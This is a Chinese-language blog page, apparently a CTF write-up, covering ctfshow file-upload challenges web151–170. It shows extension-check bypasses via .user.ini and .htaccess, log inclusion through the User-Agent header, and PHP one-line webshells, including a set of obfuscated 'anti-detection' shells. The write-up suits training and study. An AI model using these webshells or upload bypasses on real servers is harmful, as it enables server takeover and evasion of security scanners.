@@ -1,0 +1,351 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ctfshow 文件上传 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="web151上传图片马，抓包进行后缀修改即可。
+
+
+
+web152跟web151一样，抓包修改后缀，连接蚁剑。
+web153（.user.ini使用）这题一开始是尝试了很多中绕过，点、空格之类的，但,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ctfshow 文件上传</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ctfshow 文件上传</h1>
+        <div class="stuff">
+            <span>八月 15, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ctfshow%E5%88%B7%E9%A2%98/" rel="tag">ctfshow刷题</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>上传图片马，抓包进行后缀修改即可。</p>
+<p><img src="1.png"></p>
+<p><img src="2.png"></p>
+<p><img src="3.png"></p>
+<h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>跟web151一样，抓包修改后缀，连接蚁剑。</p>
+<h3 id="web153（-user-ini使用）"><a href="#web153（-user-ini使用）" class="headerlink" title="web153（.user.ini使用）"></a>web153（.user.ini使用）</h3><p>这题一开始是尝试了很多中绕过，点、空格之类的，但是都没有办法绕过。.htaccess也不行，考虑.user.ini</p>
+<ul>
+<li>对于php中的.usr.ini有如下解释：</li>
+</ul>
+<p>PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.usr.ini中如果设置了文件名，那么同一目录下任意一个页面都会将该文件中的内容包含进去，如果有php代码，则被包含的文件就可以被当做PHP解析。</p>
+<p>auto_prepend_file:在页面顶部加载文件</p>
+<p>auto_append_file:在页面底部加载文件</p>
+<p>这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）</p>
+<ul>
+<li>也就是说：如果.user.ini的内容为：</li>
+</ul>
+<p>auto_prepend_file=a.txt</p>
+<p>那么当我们上传.user.ini，然后上传a.txt时，在.user.ini文件同一目录下的所有页面文件代码都会对a.txt进行文件包含操作，如果此时有一个php代码，a.txt中也正好为php代码的话。a.txt就会被当做php代码进行解析。</p>
+<p>那么在这个题目中，upload的目录下正好存在index.php。</p>
+<ol>
+<li>上传.user.ini，内容为：auto_prepend_file=a.txt</li>
+</ol>
+<p>因为代码对格式的验证，将后缀改为.png上传，抓包后修改；</p>
+<p><img src="4.png"></p>
+<ol start="2">
+<li>上传a.txt，内容为**<?php @eval($_POST[fox]) ?>**</li>
+</ol>
+<p>也因代码对格式的验证，将后缀改为.png上传，抓包后修改；</p>
+<p><img src="5.png"></p>
+<ol start="3">
+<li>因为上述上传文件都上传到upload目录下，且upload目录下存在index.php会对a.txt进行文件包含操作，使得一句话木马被成功解析，连接蚁剑，访问url/upload/index.php，得到flag。</li>
+</ol>
+<p><img src="6.png"></p>
+<h3 id="web154-155（-user-ini-php短标签）"><a href="#web154-155（-user-ini-php短标签）" class="headerlink" title="web154-155（.user.ini+php短标签）"></a>web154-155（.user.ini+php短标签）</h3><ul>
+<li>PHP的四种标签写法：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">1</span>; <span class="meta">?&gt;</span> 正常写法</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="number">1</span>; <span class="meta">?&gt;</span> 短标签写法，<span class="number">5.4</span> 起 <span class="meta">&lt;?=</span> <span class="string">&#x27;hello&#x27;</span>; === <span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="number">1</span>; %&gt; asp 风格写法</span><br><span class="line"></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt; <span class="keyword">echo</span> <span class="number">1</span>; &lt;/script&gt; 长标签写法</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li>这一题的绕过是在 web153的基础上，增加了php短标签的写法：</li>
+</ol>
+<p>a.txt中的一句话木马需要使用短标签进行绕过：</p>
+<p><strong><?= eval($_POST[fox]);?></strong></p>
+<p>步骤和上方web153一样，只是文件使用了短标签，上传两个文件之后，同样是连接蚁剑，得到flag。</p>
+<p><img src="7.png"></p>
+<h3 id="web156（-user-ini-短标签-过滤-）"><a href="#web156（-user-ini-短标签-过滤-）" class="headerlink" title="web156（ .user.ini+短标签+过滤[]）"></a>web156（ .user.ini+短标签+过滤[]）</h3><p>在前面短标签的基础上过滤了一句话木马中的[]，使用{}进行绕过，连接蚁剑得到flag。</p>
+<p><strong><?= eval($_POST{1}) ; ?></strong></p>
+<p><img src="8.png"></p>
+<h3 id="web157-web158-web159"><a href="#web157-web158-web159" class="headerlink" title="web157  web158  web159"></a>web157  web158  web159</h3><p>过滤了{}和分号，直接查询flag.php文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;tac ../f\*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>或者</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`tac ../f*`<span class="meta">?&gt;</span>            <span class="comment">//反引号绕过</span></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>`tac ../flag.?hp`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>先上传.user.ini，再上传上述内容的文件，直接访问URL/upload/index.php即可。</p>
+<h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>过滤了括号，直接使用反引号绕过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`tac ../f*`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>即可，上传文件后直接访问URL/upload/index.php。</p>
+<h3 id="web160：日志包含绕过（不能上传-php文件，因此只能配合文件包含进行操作）"><a href="#web160：日志包含绕过（不能上传-php文件，因此只能配合文件包含进行操作）" class="headerlink" title="web160：日志包含绕过（不能上传.php文件，因此只能配合文件包含进行操作）"></a>web160：日志包含绕过（不能上传.php文件，因此只能配合文件包含进行操作）</h3><p>反引号也被过滤掉了。</p>
+<ol>
+<li>将a.txt内容改为<?=include"/var/lo"."g/nginx/access.lo"."g"?>因为log被过滤了。所以用拼接绕过；</li>
+</ol>
+<p>上传完.user.ini和a.txt后</p>
+<ol start="2">
+<li>访问网站然后修改user-agent头信息，改为：**<?=system('tac ../f\*')?>**</li>
+</ol>
+<p><img src="9.png"></p>
+<p><strong>直接访问URL/upload/index.php得到flag。</strong></p>
+<p><strong>也可以将user-agent修改为一句话木马，进行蚁剑连接。</strong></p>
+<p>###<strong>web161</strong></p>
+<p><strong>添加一个文件头，其他步骤同160.</strong></p>
+<p><img src="10.png"></p>
+<p><img src="11.png"></p>
+<h3 id="web162-163-（session文件包含-条件竞争）"><a href="#web162-163-（session文件包含-条件竞争）" class="headerlink" title="web162-163  （session文件包含+条件竞争）"></a>web162-163  （session文件包含+条件竞争）</h3><p>不写）</p>
+<h3 id="web164-165（jpg-png二次渲染）"><a href="#web164-165（jpg-png二次渲染）" class="headerlink" title="web164-165（jpg png二次渲染）"></a>web164-165（jpg png二次渲染）</h3><p>不写）</p>
+<h3 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h3><p>查看网页源代码发现只能上传.zip文件</p>
+<p><img src="12.png"></p>
+<p>上传一个.zip文件，返回一个.zip的文件</p>
+<p><img src="13.png"></p>
+<p>通过蚁剑连接：</p>
+<p><a target="_blank" rel="noopener" href="http://024084fb-db74-4db8-9a26-a087a506da10.challenge.ctf.show:8080/upload/download.php?file=1b3a28b49bb8631ae5b7c66aef0a22cc.zip">http://024084fb-db74-4db8-9a26-a087a506da10.challenge.ctf.show:8080/upload/download.php?file=1b3a28b49bb8631ae5b7c66aef0a22cc.zip</a></p>
+<p>这里要注意路径</p>
+<p>连接得到flag。</p>
+<h3 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h3><ul>
+<li><p>httped的提示 ，想到Apache解析漏洞，发现不行，再想到.htaccess:</p>
+</li>
+<li><p>.htaccess</p>
+</li>
+</ul>
+<p>只能用于Apache服务器</p>
+<p>SetHandler application/x-httpd-php .png #把png文件当做php文件解析</p>
+<ul>
+<li>.user.ini</li>
+</ul>
+<p>可以用于多种服务器，但前提是同级目录下必须有一个php文件</p>
+<ul>
+<li>先上传一个.htaccess:</li>
+</ul>
+<p>&lt;FilesMatch “1”&gt;</p>
+<p>SetHandler application/x-httpd-php</p>
+</FilesMatch>
+
+<p>将同目录下所有文件名为1的文件都当做PHP脚本执行。</p>
+<ol>
+<li>题目限制只能上传.jpg，抓包修改后缀：</li>
+</ol>
+<p><img src="14.png"></p>
+<p>然后上传一个1.jpg文件：**<?php @eval($_POST[fox]);?>**</p>
+<p>直接连接蚁剑：</p>
+<p><a target="_blank" rel="noopener" href="http://9865112a-96af-4567-84da-914ae922fd1f.challenge.ctf.show:8080/upload/1.jpg">http://9865112a-96af-4567-84da-914ae922fd1f.challenge.ctf.show:8080/upload/1.jpg</a></p>
+<p>即可。因为文件名为1的jpg文件也当做PHP执行了，连接得到flag。</p>
+<h3 id="web168（基础免杀）"><a href="#web168（基础免杀）" class="headerlink" title="web168（基础免杀）"></a>web168（基础免杀）</h3><ul>
+<li>一些免杀脚本</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_REQUEST</span>[<span class="number">1</span>]`;<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//利用反引号执行系统命令</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;(<span class="variable">$a</span>)(<span class="string">&#x27;ls ../&#x27;</span>);</span><br><span class="line"></span><br><span class="line">拼接</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">拼接</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=substr(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">拼接</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=strrev(<span class="string">&#x27;metsys&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">反转字符</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;abs&#125;)(<span class="variable">$$pi</span>&#123;acos&#125;);</span><br><span class="line"></span><br><span class="line">\<span class="comment"># get传参   abs=system&amp;acos=ls</span></span><br><span class="line"></span><br><span class="line">数学函数</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">// 使用时请删除此行, 连接密码: TyKPuntU <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$bFIY</span>=create_function(chr(<span class="number">25380</span>/<span class="number">705</span>).chr(<span class="number">92115</span>/<span class="number">801</span>).base64_decode(<span class="string">&#x27;bw==&#x27;</span>).base64_decode(<span class="string">&#x27;bQ==&#x27;</span>).base64_decode(<span class="string">&#x27;ZQ==&#x27;</span>),chr(<span class="number">0x16964</span>/<span class="number">0x394</span>).chr(<span class="number">0x6f16</span>/<span class="number">0xf1</span>).base64_decode(<span class="string">&#x27;YQ==&#x27;</span>).base64_decode(<span class="string">&#x27;bA==&#x27;</span>).chr(<span class="number">060340</span>/<span class="number">01154</span>).chr(<span class="number">01041</span>-<span class="number">0775</span>).base64_decode(<span class="string">&#x27;cw==&#x27;</span>).str_rot13(<span class="string">&#x27;b&#x27;</span>).chr(<span class="number">01504</span>-<span class="number">01327</span>).base64_decode(<span class="string">&#x27;ZQ==&#x27;</span>).chr(<span class="number">057176</span>/<span class="number">01116</span>).chr(<span class="number">0xe3b4</span>/<span class="number">0x3dc</span>));<span class="variable">$bFIY</span>(base64_decode(<span class="string">&#x27;NjgxO&#x27;</span>.<span class="string">&#x27;Tc7QG&#x27;</span>.<span class="string">&#x27;V2QWw&#x27;</span>.<span class="string">&#x27;oJF9Q&#x27;</span>.<span class="string">&#x27;&#x27;</span>.str_rot13(<span class="string">&#x27;G&#x27;</span>).str_rot13(<span class="string">&#x27;1&#x27;</span>).str_rot13(<span class="string">&#x27;A&#x27;</span>).base64_decode(<span class="string">&#x27;VQ==&#x27;</span>).str_rot13(<span class="string">&#x27;J&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">0x304</span>-<span class="number">0x2d3</span>).base64_decode(<span class="string">&#x27;Ug==&#x27;</span>).chr(<span class="number">13197</span>/<span class="number">249</span>).str_rot13(<span class="string">&#x27;F&#x27;</span>).base64_decode(<span class="string">&#x27;MQ==&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;B1bnR&#x27;</span>.<span class="string">&#x27;VXSk7&#x27;</span>.<span class="string">&#x27;MjA0N&#x27;</span>.<span class="string">&#x27;TkxOw&#x27;</span>.<span class="string">&#x27;==&#x27;</span>.<span class="string">&#x27;&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li>因为过滤了eval，一句话木马不能启用，并且还过滤了system，无法进行命令执行的使用，只能直接让其输出结果，利用文件上传到/upload/路径下，上传11.php：</li>
+</ol>
+<p><img src="15.png"></p>
+<p>然后直接访问：URL/upload/11.php得到flag：</p>
+<p><img src="16.png"></p>
+<h3 id="web169（日志包含）"><a href="#web169（日志包含）" class="headerlink" title="web169（日志包含）"></a>web169（日志包含）</h3><p>网页的源代码限制只能上传.zip文件，上传后进行后缀和表单content-type的修改：</p>
+<p><img src="17.png"></p>
+<p><strong>auto_prepend_file=/var/log/nginx/access.log</strong>这里就是配置到user-agent里去了，所以上传.php文件的时候可以直接在user-agent处添加一句话木马：</p>
+<p><img src="18.png"></p>
+<h3 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h3><p>只要在.user.ini文件添加一个文件头，其他步骤个web169一样，只是多了一个文件内容的验证。</p>
+<p><img src="19.png"></p>
+<p><img src="20.png"></p>
+<p><img src="21.png"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web151"><span class="toc-number">1.</span> <span class="toc-text">web151</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web152"><span class="toc-number">2.</span> <span class="toc-text">web152</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web153%EF%BC%88-user-ini%E4%BD%BF%E7%94%A8%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">web153（.user.ini使用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web154-155%EF%BC%88-user-ini-php%E7%9F%AD%E6%A0%87%E7%AD%BE%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">web154-155（.user.ini+php短标签）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web156%EF%BC%88-user-ini-%E7%9F%AD%E6%A0%87%E7%AD%BE-%E8%BF%87%E6%BB%A4-%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">web156（ .user.ini+短标签+过滤[]）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web157-web158-web159"><span class="toc-number">6.</span> <span class="toc-text">web157  web158  web159</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web159"><span class="toc-number">7.</span> <span class="toc-text">web159</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web160%EF%BC%9A%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87%EF%BC%88%E4%B8%8D%E8%83%BD%E4%B8%8A%E4%BC%A0-php%E6%96%87%E4%BB%B6%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%8F%AA%E8%83%BD%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">web160：日志包含绕过（不能上传.php文件，因此只能配合文件包含进行操作）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web162-163-%EF%BC%88session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%89"><span class="toc-number">9.</span> <span class="toc-text">web162-163  （session文件包含+条件竞争）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web164-165%EF%BC%88jpg-png%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%EF%BC%89"><span class="toc-number">10.</span> <span class="toc-text">web164-165（jpg png二次渲染）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web166"><span class="toc-number">11.</span> <span class="toc-text">web166</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web167"><span class="toc-number">12.</span> <span class="toc-text">web167</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web168%EF%BC%88%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%EF%BC%89"><span class="toc-number">13.</span> <span class="toc-text">web168（基础免杀）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web169%EF%BC%88%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">14.</span> <span class="toc-text">web169（日志包含）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web170"><span class="toc-number">15.</span> <span class="toc-text">web170</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
